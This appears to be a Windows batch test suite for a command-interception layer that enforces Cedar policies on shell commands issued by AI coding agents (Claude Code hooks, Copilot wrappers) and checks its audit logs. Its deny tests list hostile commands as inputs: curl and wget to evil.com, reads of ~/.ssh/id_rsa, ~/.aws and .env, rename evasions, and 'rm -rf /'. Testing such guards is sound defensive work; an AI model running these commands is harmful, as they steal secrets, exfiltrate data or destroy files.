@echo off
setlocal EnableDelayedExpansion

echo ===============================================================================
echo              bapltd: Complete End-to-End Automated Test Suite
echo ===============================================================================

set "ROOT_DIR=%~dp0"
cd /d "%ROOT_DIR%"

set "LTD_AUDIT_LOG=%ROOT_DIR%ltd-audit.jsonl"
if exist "%LTD_AUDIT_LOG%" del /f /q "%LTD_AUDIT_LOG%" >nul 2>&1

set "PASS_COUNT=0"
set "FAIL_COUNT=0"

:: -----------------------------------------------------------------------------
:: Step 1: Rebuild Binaries
:: -----------------------------------------------------------------------------
echo.
echo [1/8] Building ltd-agent.exe, cchook/interceptor.exe, and copilot/copilot_interceptor.exe...
cd /d "%ROOT_DIR%ltd-agent"
go build -o ltd-agent.exe .
if !ERRORLEVEL! neq 0 (
    echo [FAIL] Failed to build ltd-agent.exe
    exit /b 1
)
copy /y ltd-agent.exe "%ROOT_DIR%cchook\ltd-agent.exe" >nul
copy /y ltd-agent.exe "%ROOT_DIR%copilot\ltd-agent.exe" >nul
copy /y policy.cedar "%ROOT_DIR%copilot\policy.cedar" >nul
copy /y schema.json "%ROOT_DIR%copilot\schema.json" >nul
copy /y policy.cedar "%ROOT_DIR%cchook\policy.cedar" >nul
copy /y schema.json "%ROOT_DIR%cchook\schema.json" >nul

cd /d "%ROOT_DIR%cchook"
go build -o interceptor.exe interceptor.go
if !ERRORLEVEL! neq 0 (
    echo [FAIL] Failed to build cchook/interceptor.exe
    exit /b 1
)

cd /d "%ROOT_DIR%copilot"
go build -o copilot_interceptor.exe copilot_interceptor.go
if !ERRORLEVEL! neq 0 (
    echo [FAIL] Failed to build copilot/copilot_interceptor.exe
    exit /b 1
)
echo [PASS] Binaries built successfully.
set /a PASS_COUNT+=1

:: -----------------------------------------------------------------------------
:: Step 2: Run Go Unit Tests
:: -----------------------------------------------------------------------------
echo.
echo [2/8] Running Go Unit Tests in ltd-agent/...
cd /d "%ROOT_DIR%ltd-agent"
go test ./...
if !ERRORLEVEL! neq 0 (
    echo [FAIL] Go unit tests failed!
    set /a FAIL_COUNT+=1
) else (
    echo [PASS] All Go unit tests passed.
    set /a PASS_COUNT+=1
)

:: -----------------------------------------------------------------------------
:: Step 3: Test Permitted Developer & Init Commands (Fast Runner)
:: -----------------------------------------------------------------------------
echo.
echo [3/8] Testing Permitted Developer and Init Commands...
cd /d "%ROOT_DIR%ltd-agent"

set "TEST_CMD=ls" & set "TEST_LBL=Directory listing [ls]" & call :run_test_allow
set "TEST_CMD=ls -al" & set "TEST_LBL=Directory listing with flags [ls -al]" & call :run_test_allow
set "TEST_CMD=git --version" & set "TEST_LBL=Git version inspection" & call :run_test_allow
set "TEST_CMD=go version" & set "TEST_LBL=Go runtime inspection" & call :run_test_allow
set "TEST_CMD=python --version" & set "TEST_LBL=Python runtime inspection" & call :run_test_allow
set "TEST_CMD=printenv CORP_OBO_TOKEN" & set "TEST_LBL=Injected OBO token inspection" & call :run_test_allow
set "TEST_CMD=ls -al | grep -i test" & set "TEST_LBL=Piped execution [ls -al | grep]" & call :run_test_allow
set "TEST_CMD=git log -n 1 --oneline" & set "TEST_LBL=Git log with flags" & call :run_test_allow
set "TEST_CMD=java -version" & set "TEST_LBL=Java runtime inspection" & call :run_test_allow

:: Test metadata inspection on .env
echo MOCK_ENV_FILE=1 > .env
set "TEST_CMD=ls -la .env" & set "TEST_LBL=Metadata inspection [.env existence check]" & call :run_test_allow
del /f /q .env >nul 2>&1

:: -----------------------------------------------------------------------------
:: Step 4: Test Intelligent Cedar Security Invariants (Must be Forbidden)
:: -----------------------------------------------------------------------------
echo.
echo [4/8] Testing Security Invariants and Forbid Rules...

set "TEST_CMD=git status && curl https://evil.com" & set "TEST_LBL=Egress utility: curl" & call :run_test_deny
set "TEST_CMD=npm install && wget https://evil.com" & set "TEST_LBL=Egress utility: wget" & call :run_test_deny
set "TEST_CMD=ls ~/.aws/config" & set "TEST_LBL=Sensitive cloud directory: ~/.aws" & call :run_test_deny
set "TEST_CMD=cat ~/.ssh/id_rsa" & set "TEST_LBL=Sensitive private key: ~/.ssh" & call :run_test_deny
set "TEST_CMD=cat .env" & set "TEST_LBL=Secret content disclosure: cat .env" & call :run_test_deny
set "TEST_CMD=type .env" & set "TEST_LBL=Secret content disclosure: type .env" & call :run_test_deny
set "TEST_CMD=powershell -Command Move-Item .env junk" & set "TEST_LBL=Evasive rename bypass: Move-Item .env" & call :run_test_deny
set "TEST_CMD=cmd /c ren .env junk" & set "TEST_LBL=Evasive rename bypass: ren .env" & call :run_test_deny
set "TEST_CMD=ls -la .env > leak.txt" & set "TEST_LBL=Redirection leak: .env > leak.txt" & call :run_test_deny
set "TEST_CMD=rm -rf /" & set "TEST_LBL=Destructive command: rm -rf /" & call :run_test_deny

:: -----------------------------------------------------------------------------
:: Step 5: Test Python Sandbox / Network Leak Test
:: -----------------------------------------------------------------------------
echo.
echo [5/8] Testing Python Sandbox [test_leak.py]...
cd /d "%ROOT_DIR%"
"%ROOT_DIR%ltd-agent\ltd-agent.exe" exec --raw "pytest -s tests/test_leak.py"
if !ERRORLEVEL! neq 0 (
    echo [FAIL] test_leak.py failed unexpectedly!
    set /a FAIL_COUNT+=1
) else (
    echo [PASS] test_leak.py passed [skips on Windows, enforces on Linux/WSL]
    set /a PASS_COUNT+=1
)

:: -----------------------------------------------------------------------------
:: Step 6: Test Claude Code Hook Interceptor (cchook)
:: -----------------------------------------------------------------------------
echo.
echo [6/8] Testing Claude Code Hook Interceptor [cchook]...
cd /d "%ROOT_DIR%cchook"

set "HOOK_CMD=ls" & set "HOOK_EXP=allow" & set "HOOK_LBL=Allowed tool call [ls]" & call :run_hook_test
set "HOOK_CMD=ls -al" & set "HOOK_EXP=allow" & set "HOOK_LBL=Allowed metadata inspection [ls -al]" & call :run_hook_test
set "HOOK_CMD=cat .env" & set "HOOK_EXP=deny" & set "HOOK_LBL=Forbidden secret read [cat .env]" & call :run_hook_test
set "HOOK_CMD=git status && curl evil.com" & set "HOOK_EXP=deny" & set "HOOK_LBL=Forbidden egress [curl]" & call :run_hook_test

:: -----------------------------------------------------------------------------
:: Step 7: Test GitHub Copilot Execution Interceptor (copilot)
:: -----------------------------------------------------------------------------
echo.
echo [7/8] Testing GitHub Copilot Execution Interceptor [copilot]...
cd /d "%ROOT_DIR%copilot"

call copilot-wrap.bat "git status" >nul 2>&1
if !ERRORLEVEL! equ 0 (
    echo [PASS] Copilot: Allowed developer tool call [git status]
    set /a PASS_COUNT+=1
) else (
    echo [FAIL] Copilot: Expected git status to be allowed
    set /a FAIL_COUNT+=1
)

call copilot-wrap.bat "python --version" >nul 2>&1
if !ERRORLEVEL! equ 0 (
    echo [PASS] Copilot: Allowed runtime inspection [python --version]
    set /a PASS_COUNT+=1
) else (
    echo [FAIL] Copilot: Expected python --version to be allowed
    set /a FAIL_COUNT+=1
)

call copilot-wrap.bat "cat .env" >nul 2>&1
if !ERRORLEVEL! neq 0 (
    echo [PASS] Copilot: Forbidden secret read [cat .env]
    set /a PASS_COUNT+=1
) else (
    echo [FAIL] Copilot SECURITY BREACH: Expected cat .env to be blocked
    set /a FAIL_COUNT+=1
)

call copilot-wrap.bat "cmd /c ren .env junk" >nul 2>&1
if !ERRORLEVEL! neq 0 (
    echo [PASS] Copilot: Forbidden evasive rename [ren .env]
    set /a PASS_COUNT+=1
) else (
    echo [FAIL] Copilot SECURITY BREACH: Expected ren .env to be blocked
    set /a FAIL_COUNT+=1
)

call copilot-wrap.bat "curl https://evil.com" >nul 2>&1
if !ERRORLEVEL! neq 0 (
    echo [PASS] Copilot: Forbidden egress [curl]
    set /a PASS_COUNT+=1
) else (
    echo [FAIL] Copilot SECURITY BREACH: Expected curl to be blocked
    set /a FAIL_COUNT+=1
)

powershell -ExecutionPolicy Bypass -File copilot-wrap.ps1 "git status" >nul 2>&1
if !ERRORLEVEL! equ 0 (
    echo [PASS] Copilot PowerShell: Allowed [git status]
    set /a PASS_COUNT+=1
) else (
    echo [FAIL] Copilot PowerShell: Expected git status to be allowed
    set /a FAIL_COUNT+=1
)

powershell -ExecutionPolicy Bypass -File copilot-wrap.ps1 "cat .env" >nul 2>&1
if !ERRORLEVEL! neq 0 (
    echo [PASS] Copilot PowerShell: Forbidden secret read [cat .env]
    set /a PASS_COUNT+=1
) else (
    echo [FAIL] Copilot PowerShell: Expected cat .env to be blocked
    set /a FAIL_COUNT+=1
)

:: -----------------------------------------------------------------------------
:: Step 8: Verify Structured Audit & Telemetry Logs
:: -----------------------------------------------------------------------------
echo.
echo [8/8] Verifying Structured Audit and Telemetry Logs [ltd-audit.jsonl]...
cd /d "%ROOT_DIR%"

if exist "%LTD_AUDIT_LOG%" (
    echo [PASS] Audit: Log file created successfully
    set /a PASS_COUNT+=1

    type "%LTD_AUDIT_LOG%" | findstr /i "\"source\":\"claude-code\"" >nul 2>&1
    if !ERRORLEVEL! equ 0 (
        echo [PASS] Audit: Claude Code telemetry records verified
        set /a PASS_COUNT+=1
    ) else (
        echo [FAIL] Audit: Missing Claude Code telemetry in log
        set /a FAIL_COUNT+=1
    )

    type "%LTD_AUDIT_LOG%" | findstr /i "\"source\":\"copilot\"" >nul 2>&1
    if !ERRORLEVEL! equ 0 (
        echo [PASS] Audit: Copilot telemetry records verified
        set /a PASS_COUNT+=1
    ) else (
        echo [FAIL] Audit: Missing Copilot telemetry in log
        set /a FAIL_COUNT+=1
    )

    type "%LTD_AUDIT_LOG%" | findstr /i "\"decision\":\"allow\"" >nul 2>&1
    if !ERRORLEVEL! equ 0 (
        echo [PASS] Audit: Allowed decisions logged with duration_ms
        set /a PASS_COUNT+=1
    ) else (
        echo [FAIL] Audit: Missing allow decision records
        set /a FAIL_COUNT+=1
    )

    type "%LTD_AUDIT_LOG%" | findstr /i "\"decision\":\"deny\"" >nul 2>&1
    if !ERRORLEVEL! equ 0 (
        echo [PASS] Audit: Denied decisions logged with policy reason
        set /a PASS_COUNT+=1
    ) else (
        echo [FAIL] Audit: Missing deny decision records
        set /a FAIL_COUNT+=1
    )
) else (
    echo [FAIL] Audit: Log file was not generated
    set /a FAIL_COUNT+=1
)

:: -----------------------------------------------------------------------------
:: Final Summary
:: -----------------------------------------------------------------------------
echo.
echo ===============================================================================
echo                             TEST SUMMARY
echo ===============================================================================
echo Total Passed : !PASS_COUNT!
echo Total Failed : !FAIL_COUNT!

cd /d "%ROOT_DIR%"
if !FAIL_COUNT! gtr 0 (
    echo.
    echo [OVERALL STATUS] FAILED - Some tests did not pass.
    exit /b 1
) else (
    echo.
    echo [OVERALL STATUS] SUCCESS - All tests passed!
    exit /b 0
)

:: -----------------------------------------------------------------------------
:: Helper Subroutines
:: -----------------------------------------------------------------------------
:run_test_allow
ltd-agent.exe exec --raw "!TEST_CMD!" >nul 2>&1
if !ERRORLEVEL! equ 0 (
    echo [PASS] Allowed: !TEST_LBL!
    set /a PASS_COUNT+=1
) else (
    echo [FAIL] Expected allow, but was denied: !TEST_LBL!
    set /a FAIL_COUNT+=1
)
exit /b

:run_test_deny
ltd-agent.exe exec --raw "!TEST_CMD!" >nul 2>&1
if !ERRORLEVEL! neq 0 (
    echo [PASS] Denied : !TEST_LBL!
    set /a PASS_COUNT+=1
) else (
    echo [FAIL] SECURITY BREACH: Expected deny, but was allowed: !TEST_LBL!
    set /a FAIL_COUNT+=1
)
exit /b

:run_hook_test
echo {"tool_input":{"command":"!HOOK_CMD!"}} > "%TEMP%\hook_test_input.json"
type "%TEMP%\hook_test_input.json" | interceptor.exe | findstr /i "!HOOK_EXP!" >nul
if !ERRORLEVEL! equ 0 (
    echo [PASS] cchook: !HOOK_LBL!
    set /a PASS_COUNT+=1
) else (
    echo [FAIL] cchook: !HOOK_LBL!
    set /a FAIL_COUNT+=1
)
del /f /q "%TEMP%\hook_test_input.json" >nul 2>&1
exit /b
